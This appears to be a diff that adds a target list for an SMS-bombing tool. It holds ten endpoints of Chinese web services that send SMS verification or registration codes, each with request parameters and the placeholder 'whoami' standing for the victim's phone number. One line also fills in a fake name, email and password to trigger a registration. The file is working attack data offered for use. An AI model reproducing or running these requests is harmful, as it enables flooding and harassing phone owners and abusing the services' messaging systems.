@@ -1,0 +1,10 @@
+https://api.xiaoxiangyoupin.com/v2/sms/getLoginSmsCode.json  mobile=whoami&type=0
+https://passport.shuidihuzhu.com/api/useraccount/sendVerifyCode  mobile=whoami&bizType=5
+http://api.gaotu100.com/user/v2/send_passcode  captcha_mode=NETEASE&type=3&mobile=whoami&code_type=0
+http://ct.ctrip.com/me/register/Verify	name=%E5%B0%8F%E7%8E%8B&email=xiaowng%40qq.com&mobile=whoami&passwd=aA123456
+http://api.yishouapp.com/users/send_receive_SMS  mobile=whoami
+https://user.qunar.com/webApi/logincode.jsp  mobile=whoami&vcode=&origin=wechat$$$qunar&action=register&type=implicit
+http://bank.wo.cn/hand/getRandCode  phone=whoami&flag=3
+http://user.daojia.com/mobile/getcode  mobile=whoami
+http://uac.10010.com/oauth2/OpSms?callback=jsonp1523951607008&req_time=1523951624725   user_id=whoami&app_code=MOBILE_MALL
+http://login.ccd.com.cn/Home/SendCheckCode  phone=whoami&urltype=cl
